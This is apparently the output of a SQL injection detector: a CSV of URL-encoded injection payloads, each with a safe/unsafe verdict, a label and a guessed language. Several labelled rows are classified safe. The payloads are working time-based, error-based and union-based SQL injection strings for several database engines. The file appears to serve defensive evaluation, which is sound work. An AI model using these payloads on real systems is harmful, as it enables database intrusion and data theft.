request_id,url,payload,classification,probability,label,detected_language,detected_language_confidence
b9dab1e3,,1%27%29%29%20as%20qgyz%20where%201547%3D1547%20and%208594%3D%28select%208594%20from%20pg_sleep%285%29%29--,unsafe,,1,txt,0.5781173706054688
c8abc59e,,1%27%20where%206963%3D6963%20and%20char%28109%29%7C%7Cchar%2879%29%7C%7Cchar%2870%29%7C%7Cchar%2890%29%3Dregexp_substring%28repeat%28right%28char%285012%29%2C0%29%2C5000000000%29%2Cnull%29--,unsafe,,1,javascript,0.5969589352607727
bff92fc7,,1%27%29%29%3Bselect%20%28case%20when%20%283365%3D6236%29%20then%203365%20else%201/%28select%200%29%20end%29--,safe,,1,javascript,0.6879575848579407
ba6ad972,,1%22%29%20as%20mibc%20where%203113%3D3113%3Bselect%20%28case%20when%20%286276%3D6276%29%20then%206276%20else%206276%2A%28select%206276%20from%20information_schema.character_sets%29%20end%29%23,unsafe,,1,txt,0.3166910707950592
1737ec82,,1%27%29%29%20waitfor%20delay%20%270%3A0%3A5%27%20and%20%28%28%27amnf%27%20like%20%27amnf,unsafe,,1,txt,0.6016618609428406
f67ff0e3,,1%22%20where%205353%3D5353%20and%20exp%28~%28select%20%2A%20from%20%28select%20concat%280x7171706a71%2C%28select%20%28elt%288190%3D8190%2C1%29%29%29%2C0x717a767a71%2C0x78%29%29x%29%29--,unsafe,,1,txt,0.4249802529811859
c9e422ca,,1%27%20where%207504%3D7504%20and%20char%28120%29%7C%7Cchar%28106%29%7C%7Cchar%28117%29%7C%7Cchar%2885%29%3Dregexp_substring%28repeat%28right%28char%289981%29%2C0%29%2C5000000000%29%2Cnull%29--,unsafe,,1,txt,0.31785279512405396
e6336df3,,1%27%29%29%3Bselect%20count%28%2A%29%20from%20domain.domains%20as%20t1%2Cdomain.columns%20as%20t2%2Cdomain.tables%20as%20t3%20and%20%28%28%27zaru%27%3D%27zaru,unsafe,,1,javascript,0.8861568570137024
cba7e150,,1%25%27%29%29%29%3Bselect%20dbms_pipe.receive_message%28chr%28112%29%7C%7Cchr%2870%29%7C%7Cchr%28106%29%7C%7Cchr%2878%29%2C5%29%20from%20dual--,unsafe,,1,txt,0.7421798706054688
cc132c5d,,-4802%20union%20all%20select%207381%2C7381%2C7381%2C7381%2C7381%2C7381%2C7381%2C7381%2C7381%2C7381--,unsafe,,1,txt,0.30318892002105713
fa0b25c8,,1%27%29%20and%204386%3Dutl_inaddr.get_host_address%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%284386%3D4386%29%20then%201%20else%200%20end%29%20from%20dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29,unsafe,,1,txt,0.7712653875350952
b14e1fb8,,1%25%22%20or%20%28select%20%2A%20from%20%28select%28sleep%285%29%29%29sddo%29%23,unsafe,,1,sql,0.9988478422164917
a84dbbba,,1%29%20as%20bpap%20where%207758%3D7758%20or%204240%3D%28select%204240%20from%20pg_sleep%285%29%29--,unsafe,,1,txt,0.7433223128318787
c5e1de37,,1%27%29%29%29%20procedure%20analyse%28extractvalue%289255%2Cconcat%280x5c%2C%28benchmark%285000000%2Cmd5%280x52515a50%29%29%29%29%29%2C1%29%20and%20%28%28%28%27dzzx%27%3D%27dzzx,unsafe,,1,txt,0.49700993299484253
25b12f15,,-4925%22%20union%20all%20select%205686%2C5686%2C5686%2C5686%2C5686%2C5686%2C5686%23,unsafe,,1,csv,0.9062286615371704
cc99e217,,1%27%2B%28select%20soqk%20where%205383%3D5383%3Bselect%20pg_sleep%285%29--,unsafe,,1,txt,0.6961491107940674
c4ef03cd,,1%25%22%29%20and%20make_set%288403%3D8403%2C8899%29%20and%20%28%22%25%22%3D%22,unsafe,,1,txt,0.34695693850517273
780059e5,,1%27%29%29%3Bselect%20pg_sleep%285%29--,safe,,1,txt,0.4043569564819336
3ea321ab,,1%25%27%29%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%23,unsafe,,1,txt,0.390694260597229
ccf9f7a9,,1%22%29%29%20as%20xcyo%20where%202929%3D2929%3Bselect%20sleep%285%29--,unsafe,,1,txt,0.5623066425323486
5d358afa,,-9564%20or%204144%3D%28select%20upper%28xmltype%28chr%2860%29%7C%7Cchr%2858%29%7C%7Cchr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%284144%3D4144%29%20then%201%20else%200%20end%29%20f,unsafe,,1,javascript,0.7452542185783386
f64672de,,1%29%20and%206537%3Ddbms_pipe.receive_message%28chr%2876%29%7C%7Cchr%28116%29%7C%7Cchr%28117%29%7C%7Cchr%2865%29%2C5%29%20and%20%284959%3D4959,unsafe,,1,txt,0.3664006292819977
41e6d900,,1%27%2B%28select%20%27ohdf%27%20where%207878%3D7878%20and%205678%3D3277--,unsafe,,1,txt,0.32458236813545227
1b54c67d,,1%3Bselect%20count%28%2A%29%20from%20generate_series%281%2C5000000%29%23%20fnck,unsafe,,1,sql,0.9611205458641052
c9afb39c,,1%27%20and%207756%3Ddbms_utility.sqlid_to_sqlhash%28%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%287756%3D7756%29%20then%201%20else%200%20end%29%20from%20dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29%29,unsafe,,1,javascript,0.6063095331192017
55e919b8,,1%29%29%29%20and%206467%3D1864%23,unsafe,,1,txt,0.2995065748691559
07d0548f,,1%25%22%3Bcall%20regexp_substring%28repeat%28right%28char%282385%29%2C0%29%2C500000000%29%2Cnull%29--,safe,,1,txt,0.22364966571331024
f06ce95f,,1%22%29%20as%20nqtn%20where%205606%3D5606%20and%209660%3D%28select%20count%28%2A%29%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5%29--,unsafe,,1,txt,0.45875075459480286
8367504b,,1%25%27%29%29%20order%20by%201--,unsafe,,1,txt,0.811416506767273
4ab513e8,,1%27%20where%208803%3D8803%20or%204411%3D%28select%20count%28%2A%29%20from%20sysusers%20as%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20as%20sys4%2Csysusers%20as%20sys5%2Csysusers%20as%20sys6%2Csysusers%20as%20sys7%29--,unsafe,,1,txt,0.5570359230041504
0c85edb5,,1%22%29%20as%20ffon%20where%202738%3D2738%20and%203754%3D%28select%20upper%28xmltype%28chr%2860%29%7C%7Cchr%2858%29%7C%7Cchr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%283754%3D3754%29%20then%201%20else%200%20end%29%20from%20dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%7C%7Cchr%2862%29%29%29%20from%20dual%29--,unsafe,,1,txt,0.618204653263092
eb68417d,,1%27%29%20as%20mara%20where%207164%3D7164%3Bselect%20like%28%27abcdefg%27%2Cupper%28hex%28randomblob%28500000000/2%29%29%29%29--,unsafe,,1,html,0.5323522090911865
02353814,,1%27%20where%207125%3D7125%20or%20elt%286272%3D6272%2Csleep%285%29%29--,unsafe,,1,txt,0.6806952357292175
4e1bf124,,1%27%29%29%20and%20elt%284249%3D4249%2C7259%29%20and%20%28%28%27miir%27%20like%20%27miir,unsafe,,1,matlab,0.9177782535552979
bd163e21,,1%20where%201062%3D1062%20and%20char%28111%29%7C%7Cchar%2877%29%7C%7Cchar%28121%29%7C%7Cchar%2888%29%3Dregexp_substring%28repeat%28left%28crypt_key%28char%2865%29%7C%7Cchar%2869%29%7C%7Cchar%2883%29%2Cnull%29%2C0%29%2C500000000%29%2Cnull%29--,unsafe,,1,javascript,0.6615672707557678
6475e5d8,,1%22%29%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%23,unsafe,,1,javascript,0.7562075257301331
06174437,,1%22%29%20and%20row%286237%2C7469%29%3E%28select%20count%28%2A%29%2Cconcat%280x7171706a71%2C%28select%20%28elt%286237%3D6237%2C1%29%29%29%2C0x717a767a71%2Cfloor%28rand%280%29%2A2%29%29x%20from%20%28select%205192%20union%20select%203785%20union%20select%203931%20union%20select%207158%29a%20group%20by%20x%29%20and%20%28%22ijop%22%3D%22ijop,unsafe,,1,html,0.7922690510749817
369c58c4,,1%29%29%3B%28select%20%2A%20from%20%28select%28sleep%285%29%29%29srmq%29%20and%20%28%284982%3D4982,unsafe,,1,txt,0.8525951504707336
acacbbf2,,-2241%29%29%29%20or%20make_set%289354%3D9354%2C7185%29%20and%20%28%28%286840%3D6840,unsafe,,1,txt,0.29909440875053406
7941eee5,,1%27%20where%204417%3D4417%20and%206537%3Ddbms_pipe.receive_message%28chr%2876%29%7C%7Cchr%28116%29%7C%7Cchr%28117%29%7C%7Cchr%2865%29%2C5%29--,unsafe,,1,txt,0.41265571117401123
398e4884,,1%22%29%20or%20%28select%209173%20from%28select%20count%28%2A%29%2Cconcat%280x7171706a71%2C%28select%20%28elt%289173%3D9173%2C1%29%29%29%2C0x717a767a71%2Cfloor%28rand%280%29%2A2%29%29x%20from%20information_schema.character_sets%20group%20by%20x%29a%29%20and%20%28%22njdu%22%20like%20%22njdu,unsafe,,1,txt,0.2613934278488159
0e301326,,1%29%29%29%3Bselect%20%28case%20when%20%286276%3D6276%29%20then%206276%20else%206276%2A%28select%206276%20from%20information_schema.character_sets%29%20end%29%23,unsafe,,1,txt,0.4719897210597992
dde1b2ac,,-7345%29%20union%20all%20select%203866%23,unsafe,,1,txt,0.6741878390312195
7a075c64,,-4287%25%22%29%29%20union%20all%20select%209074%2C9074%2C9074%2C9074%2C9074%2C9074%2C9074%2C9074%2C9074%2C9074%23,unsafe,,1,csv,0.9404370188713074
5917c2a4,,1%22%29%20where%202764%3D2764%20rlike%20%28select%20%28case%20when%20%287689%3D7689%29%20then%201%20else%200x28%20end%29%29--,unsafe,,1,txt,0.9012462496757507
b6c45c2c,,-3037%22%29%29%29%20or%20elt%284758%3D9129%2C9129%29%20and%20%28%28%28%22zewv%22%20like%20%22zewv,unsafe,,1,txt,0.3623397648334503
539728bc,,1%27%2B%28select%20bjav%20where%206923%3D6923%20and%20%28select%20%2A%20from%20%28select%28sleep%285%29%29%29gcrr%29%23,unsafe,,1,sql,0.9975528120994568
4eee332d,,1%25%22%20and%20%28select%20%2A%20from%20%28select%28sleep%285%29%29%29fzno%29%20and%20%22%25%22%3D%22,unsafe,,1,txt,0.36824002861976624
3bc349cc,,-6381%25%22%20or%208571%3D8571--,unsafe,,1,txt,0.7830821871757507
120c219a,,1%27%29%20or%20updatexml%281808%2Cconcat%280x2e%2C0x7171706a71%2C%28select%20%28elt%281808%3D1808%2C1%29%29%29%2C0x717a767a71%29%2C8666%29%20and%20%28%27beju%27%20like%20%27beju,unsafe,,1,javascript,0.7443140745162964
0f8feaf1,,1%27%3Bbegin%20user_lock.sleep%285%29%3B%20end,safe,,1,matlab,0.6691113710403442
3d5b416a,,1%25%27%29%20and%20sleep%285%29%23,unsafe,,1,txt,0.25768035650253296
acb6fad1,,-8521%27%2B%28select%20ucim%20where%209003%3D9003%20union%20all%20select%209003--,unsafe,,1,txt,0.5748685002326965
50dbc50b,,1%22%29%29%20or%20char%28117%29%7C%7Cchar%28111%29%7C%7Cchar%28105%29%7C%7Cchar%28100%29%3Dregexp_substring%28repeat%28left%28crypt_key%28char%2865%29%7C%7Cchar%2869%29%7C%7Cchar%2883%29%2Cnull%29%2C0%29%2C500000000%29%2Cnull%29%20and%20%28%28%22dqis%22%3D%22dqis,unsafe,,1,javascript,0.5344251990318298
0d35824c,,-5147%20or%20%288459%3D8459%29%2A4906,unsafe,,1,txt,0.4154878854751587
5227ae64,,1%22%29%29%20as%20gvpm%20where%205170%3D5170%20or%205356%3D%28select%20count%28%2A%29%20from%20sysusers%20as%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20as%20sys4%2Csysusers%20as%20sys5%2Csysusers%20as%20sys6%2Csysusers%20as%20sys7%29--,unsafe,,1,txt,0.5198581218719482
2862a168,,-8378%25%27%29%20union%20all%20select%205491%23,unsafe,,1,txt,0.8588783144950867
9b81be01,,-9718%25%22%29%20union%20all%20select%209515%2C9515%2C9515%23,unsafe,,1,csv,0.8581018447875977
8a52411b,,1%29%29%29%20and%204595%3D4595%23,unsafe,,1,txt,0.408717542886734
f8d2102f,,1%25%22%29%29%20and%206240%3D%28%27qqpjq%27%7C%7C%28select%20case%206240%20when%206240%20then%201%20else%200%20end%20from%20rdb%24database%29%7C%7C%27qzvzq%27%29%20and%20%28%28%22%25%22%3D%22,unsafe,,1,txt,0.4101581275463104
7dd81cb7,,1%29%29%29%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%23,unsafe,,1,javascript,0.7592264413833618
76b1c41c,,-6263%22%20union%20all%20select%208005%2C8005%23,unsafe,,1,txt,0.7454121708869934
cd69855b,,1%27%20in%20boolean%20mode%29%3Biif%285257%3D5257%2C1%2C1/0%29,safe,,1,javascript,0.8373271226882935
b853c343,,1%3B%28select%20%2A%20from%20%28select%28sleep%285%29%29%29srmq%29,unsafe,,1,txt,0.7656077742576599
6f47f0a2,,1%3Bcreate%20or%20replace%20function%20sleep%28int%29%20returns%20int%20as%20%27/lib/libc.so.6%27%2C%27sleep%27%20language%20%27c%27%20strict%3B%20select%20sleep%285%29--%20hlgt,unsafe,,1,matlab,0.6360267996788025
ccad7424,,-6041%27%29%29%20or%20make_set%289835%3D1367%2C1367%29%20and%20%28%28%27hxjf%27%3D%27hxjf,unsafe,,1,txt,0.46452197432518005
18b7d51c,,1%27%29%29%29%20or%202633%3Ddbms_pipe.receive_message%28chr%28112%29%7C%7Cchr%2865%29%7C%7Cchr%2865%29%7C%7Cchr%28103%29%2C5%29%20and%20%28%28%28%27dbsm%27%3D%27dbsm,unsafe,,1,javascript,0.5691009163856506
9f36efc8,,1%27%2B%28select%20%27idmr%27%20where%205029%3D5029%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull--,unsafe,,1,javascript,0.8807032704353333
a4b9d349,,1%27%2B%28select%20taga%20where%208036%3D8036%3Bselect%20count%28%2A%29%20from%20rdb%24fields%20as%20t1%2Crdb%24types%20as%20t2%2Crdb%24collations%20as%20t3%2Crdb%24functions%20as%20t4--,unsafe,,1,txt,0.36370837688446045
ae1dea90,,1%27%20in%20boolean%20mode%29%20and%20char%28111%29%7C%7Cchar%2877%29%7C%7Cchar%28121%29%7C%7Cchar%2888%29%3Dregexp_substring%28repeat%28left%28crypt_key%28char%2865%29%7C%7Cchar%2869%29%7C%7Cchar%2883%29%2Cnull%29%2C0%29%2C500000000%29%2Cnull%29%23,unsafe,,1,javascript,0.5540704727172852
92f39ea9,,1%22%29%29%29%20and%208514%3D%28select%20count%28%2A%29%20from%20domain.domains%20as%20t1%2Cdomain.columns%20as%20t2%2Cdomain.tables%20as%20t3%29%20and%20%28%28%28%22xtyt%22%3D%22xtyt,unsafe,,1,html,0.5747941732406616
957752b2,,1%22%29%29%20as%20ndbk%20where%205042%3D5042%20and%208594%3D%28select%208594%20from%20pg_sleep%285%29%29--,unsafe,,1,txt,0.327088326215744
c1cb3e68,,1%27%29%29%29%3Bif%289431%3D6730%29%20select%209431%20else%20drop%20function%20xbkh--,unsafe,,1,javascript,0.8051833510398865
8eebbc0a,,1%27%7C%7C%28select%20%27idna%27%20from%20dual%20where%202683%3D2683%20rlike%20%28select%20%28case%20when%20%283201%3D9748%29%20then%201%20else%200x28%20end%29%29%29%7C%7C%27,unsafe,,1,txt,0.5563523769378662
f881d17a,,-1050%22%29%29%20or%204493%3Dutl_inaddr.get_host_address%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%284493%3D4493%29%20then%201%20else%200%20end%29%20from%20dual%29%7C%7Cchr%28,unsafe,,1,txt,0.256448358297348
abe5091f,,1%27%29%29%20or%202633%3Ddbms_pipe.receive_message%28chr%28112%29%7C%7Cchr%2865%29%7C%7Cchr%2865%29%7C%7Cchr%28103%29%2C5%29%20and%20%28%28%27ylql%27%20like%20%27ylql,unsafe,,1,txt,0.44462767243385315
82046ed9,,1%27%7C%7C%28select%20%27oxas%27%20from%20dual%20where%208284%3D8284%20or%20sleep%285%29%29%7C%7C%27,unsafe,,1,javascript,0.5644705891609192
92ee2439,,1%27%29%29%29%20and%203707%3D%28select%20count%28%2A%29%20from%20sysibm.systables%20as%20t1%2Csysibm.systables%20as%20t2%2Csysibm.systables%20as%20t3%29%20and%20%28%28%28%27owot%27%3D%27owot,unsafe,,1,javascript,0.6927468180656433
41ea1c13,,1%22%29%20and%203202%3Dlike%28%27abcdefg%27%2Cupper%28hex%28randomblob%28500000000/2%29%29%29%29%20and%20%28%22ikaf%22%20like%20%22ikaf,unsafe,,1,txt,0.3967905342578888
c3c3227a,,1%25%27%20or%206793%3D%28select%206793%20from%20pg_sleep%285%29%29%20and%20%27%25%27%3D%27,unsafe,,1,txt,0.2465350329875946
2f18e070,,1%29%29%29%20union%20all%20select%20null%2Cnull--,unsafe,,1,txt,0.7464309334754944
08229185,,1%25%22%29%29%20or%20char%28119%29%7C%7Cchar%28100%29%7C%7Cchar%2899%29%7C%7Cchar%28121%29%3Dregexp_substring%28repeat%28right%28char%281441%29%2C0%29%2C5000000000%29%2Cnull%29--,unsafe,,1,txt,0.3007962703704834
344a7a24,,1%22%29%3Bbegin%20dbms_lock.sleep%285%29%3B%20end--,safe,,1,javascript,0.628391444683075
bf4ddc7a,,-7371%27%29%20union%20all%20select%204531%2C4531%2C4531%23,unsafe,,1,txt,0.3408571183681488
10de8957,,1%27%20and%208594%3D%28select%208594%20from%20pg_sleep%285%29%29--,unsafe,,1,txt,0.8233579397201538
3d1e011e,,1%22%29%29%20as%20sqow%20where%208752%3D8752%3Bselect%20%28case%20when%20%281726%3D4080%29%20then%201726%20else%201/%28select%200%29%20end%29--,unsafe,,1,txt,0.5608955025672913
e432a3d2,,1%27%7C%7C%28select%20%27brsr%27%20where%205458%3D5458%3Bselect%20count%28%2A%29%20from%20domain.domains%20as%20t1%2Cdomain.columns%20as%20t2%2Cdomain.tables%20as%20t3%29%7C%7C%27,unsafe,,1,javascript,0.560509979724884
6dfbb341,,1%27%29%29%20as%20hpta%20where%205376%3D5376%20waitfor%20delay%20%270%3A0%3A5%27--,unsafe,,1,txt,0.5035771131515503
365cf05a,,1%27%29%29%29%20or%204411%3D%28select%20count%28%2A%29%20from%20sysusers%20as%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20as%20sys4%2Csysusers%20as%20sys5%2Csysusers%20as%20sys6%2Csysusers%20as%20sys7%29%20and%20%28%28%28%27gucd%27%3D%27gucd,unsafe,,1,javascript,0.5743125081062317
b25b94cd,,-1993%25%22%29%20or%205903%3D%28%27qqpjq%27%7C%7C%28select%20case%205903%20when%205903%20then%201%20else%200%20end%20from%20rdb%24database%29%7C%7C%27qzvzq%27%29%20and%20%28%22%25%22%3D%22,unsafe,,1,txt,0.47914785146713257
9217c688,,1%25%27%3Bselect%20%28case%20when%20%281407%3D2741%29%20then%201407%20else%201407%2A%28select%201407%20from%20mysql.db%29%20end%29%23,unsafe,,1,txt,0.52836674451828
2f6b31d8,,1%25%22%29%29%20or%20sleep%285%29%20and%20%28%28%22%25%22%3D%22,unsafe,,1,txt,0.43469271063804626
7c0d6475,,1%29%20where%209010%3D9010%20and%208514%3D%28select%20count%28%2A%29%20from%20domain.domains%20as%20t1%2Cdomain.columns%20as%20t2%2Cdomain.tables%20as%20t3%29--,unsafe,,1,txt,0.25821396708488464
69c21bfd,,1%27%20and%206240%3D%28%27qqpjq%27%7C%7C%28select%20case%206240%20when%206240%20then%201%20else%200%20end%20from%20rdb%24database%29%7C%7C%27qzvzq%27%29%20and%20%27pziy%27%3D%27pziy,unsafe,,1,txt,0.44251522421836853
70140585,,-7409%22%29%29%20union%20all%20select%203145%2C3145%2C3145--,unsafe,,1,txt,0.4701012074947357
5d627c5b,,-8301%27%29%29%29%20or%20%285708%3D5268%29%2A5268%20and%20%28%28%28%27hkha%27%3D%27hkha,unsafe,,1,html,0.6039351224899292
72e32d58,,1%29%20as%20odqn%20where%203910%3D3910%3Bcreate%20or%20replace%20function%20sleep%28int%29%20returns%20int%20as%20%27/lib/libc.so.6%27%2C%27sleep%27%20language%20%27c%27%20strict%3B%20select%20sleep%285%29--,unsafe,,1,txt,0.42700034379959106
625a52f3,,-6757%27%29%29%29%20or%204524%3D3696,unsafe,,1,txt,0.3368183970451355
4b4cc9d0,,1%29%29%29%3Bselect%20%28case%20when%20%283855%3D3855%29%20then%203855%20else%201/%28select%200%29%20end%29--,safe,,1,javascript,0.6490472555160522
b5dcdc37,,1%25%22%29%29%20and%207533%3D7533%20and%20%28%28%22%25%22%3D%22,unsafe,,1,txt,0.4588944613933563
5925c2e4,,1%22%20waitfor%20delay%20%270%3A0%3A5%27,unsafe,,1,txt,0.6059303879737854
344b5571,,1%20or%208466%3Dbenchmark%285000000%2Cmd5%280x694a4745%29%29%23%20irvm,unsafe,,1,txt,0.41839274764060974
b491ea99,,1%29%29%20as%20mlpf%20where%207425%3D7425%3Bselect%20sleep%285%29--,unsafe,,1,txt,0.5099194049835205
62bf5975,,1%27%29%3Bselect%20like%28%27abcdefg%27%2Cupper%28hex%28randomblob%28500000000/2%29%29%29%29%20and%20%28%27afdy%27%20like%20%27afdy,unsafe,,1,html,0.521635115146637
532105c2,,1%29%29%20or%208421%3D%28select%20count%28%2A%29%20from%20generate_series%281%2C5000000%29%29%20and%20%28%284277%3D4277,unsafe,,1,txt,0.30156373977661133
a1ce68cb,,1%27%29%29%29%20and%20elt%289041%3D6421%2C6421%29%20and%20%28%28%28%27ixxg%27%20like%20%27ixxg,unsafe,,1,javascript,0.5176688432693481
17384309,,1%29%20where%202720%3D2720%20and%20elt%284249%3D4249%2C7259%29--,unsafe,,1,txt,0.9091667532920837
a1f14ab9,,1%25%27%29%29%20and%20row%286237%2C7469%29%3E%28select%20count%28%2A%29%2Cconcat%280x7171706a71%2C%28select%20%28elt%286237%3D6237%2C1%29%29%29%2C0x717a767a71%2Cfloor%28rand%280%29%2A2%29%29x%20from%20%28select%205192%20union%20select%203785%20union%20select%203931%20union%20select%207158%29a%20group%20by%20x%29%20and%20%28%28%27%25%27%3D%27,unsafe,,1,txt,0.30538663268089294
cff70a40,,1%27%2B%28select%20%27uijv%27%20where%207279%3D7279%20and%208312%3Ddbms_pipe.receive_message%28chr%2869%29%7C%7Cchr%2879%29%7C%7Cchr%28101%29%7C%7Cchr%2868%29%2C5%29--,unsafe,,1,txt,0.4992901086807251
232d07fc,,1%22%3Bif%288812%3D7896%29%20select%208812%20else%20drop%20function%20xltk--,unsafe,,1,javascript,0.542230486869812
100e1576,,-9225%29%20or%20%288258%3D2726%29%2A2726%20and%20%289900%3D9900,unsafe,,1,txt,0.5264353156089783
e520311a,,1%22%29%29%29%20or%20char%28117%29%7C%7Cchar%28111%29%7C%7Cchar%28105%29%7C%7Cchar%28100%29%3Dregexp_substring%28repeat%28left%28crypt_key%28char%2865%29%7C%7Cchar%2869%29%7C%7Cchar%2883%29%2Cnull%29%2C0%29%2C500000000%29%2Cnull%29%20and%20%28%28%28%22urqg%22%3D%22urqg,unsafe,,1,javascript,0.7511475682258606
43423ffe,,1%22%29%29%3B%28select%20%2A%20from%20%28select%28sleep%285%29%29%29acdk%29%23,unsafe,,1,txt,0.40817561745643616
e81363f8,,1%27%20in%20boolean%20mode%29%20and%206537%3Ddbms_pipe.receive_message%28chr%2876%29%7C%7Cchr%28116%29%7C%7Cchr%28117%29%7C%7Cchr%2865%29%2C5%29%23,unsafe,,1,txt,0.30876806378364563
a767f824,,1%27%29%29%29%20and%207756%3Ddbms_utility.sqlid_to_sqlhash%28%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%287756%3D7756%29%20then%201%20else%200%20end%29%20from%20dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29%29%20and%20%28%28%28%27cgiu%27%3D%27cgiu,unsafe,,1,javascript,0.7918992042541504
c52b39d1,,-2225%27%20union%20all%20select%201545%2C1545%2C1545%2C1545%23,unsafe,,1,csv,0.535761833190918
03a62e04,,1%25%27%29%29%20and%203715%20in%20%28%28char%28113%29%2Bchar%28113%29%2Bchar%28112%29%2Bchar%28106%29%2Bchar%28113%29%2B%28select%20%28case%20when%20%283715%3D3715%29%20then%20char%2849%29%20else%20char%2848%29%20end%29%29%2Bchar%28113%29%2Bchar%28122%29%2Bchar%28118%29%2Bchar%28122%29%2Bchar%28113%29%29%29%20and%20%28%28%27%25%27%3D%27,unsafe,,1,matlab,0.9833889603614807
c8e4838b,,1%25%27%20or%208384%3Dlike%28%27abcdefg%27%2Cupper%28hex%28randomblob%28500000000/2%29%29%29%29%20and%20%27%25%27%3D%27,unsafe,,1,matlab,0.6070988178253174
d93ac437,,1%25%22%29%29%20and%207358%3D6986--,unsafe,,1,txt,0.18903745710849762
37a4e230,,1%22%29%20where%202136%3D2136%20or%207552%3D%28select%20count%28%2A%29%20from%20rdb%24fields%20as%20t1%2Crdb%24types%20as%20t2%2Crdb%24collations%20as%20t3%2Crdb%24functions%20as%20t4%29--,unsafe,,1,txt,0.35913845896720886
61ae0a9b,,-7452%20where%202224%3D2224%20or%204747%3Ddbms_utility.sqlid_to_sqlhash%28%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%284747%3D4747%29%20then%201%20else%200%20end%29%20from%20d,unsafe,,1,txt,0.5632942914962769
50aa4f7a,,1%20and%20updatexml%283393%2Cconcat%280x2e%2C0x7171706a71%2C%28select%20%28elt%283393%3D3393%2C1%29%29%29%2C0x717a767a71%29%2C1161%29,unsafe,,1,txt,0.4948541522026062
959a2a72,,1%27%20where%208469%3D8469%3Bselect%20%28case%20when%20%284769%3D4769%29%20then%204769%20else%204769%2A%28select%204769%20from%20mysql.db%29%20end%29%23,unsafe,,1,txt,0.5318523645401001
43980d95,,1%27%29%29%20and%202853%3Dcast%28%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%29%7C%7C%28select%20%28case%20when%20%282853%3D2853%29%20then%201%20else%200%20end%29%29%3A%3Atext%7C%7C%28chr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29%20as%20numeric%29%20and%20%28%28%27esal%27%3D%27esal,unsafe,,1,txt,0.37335070967674255
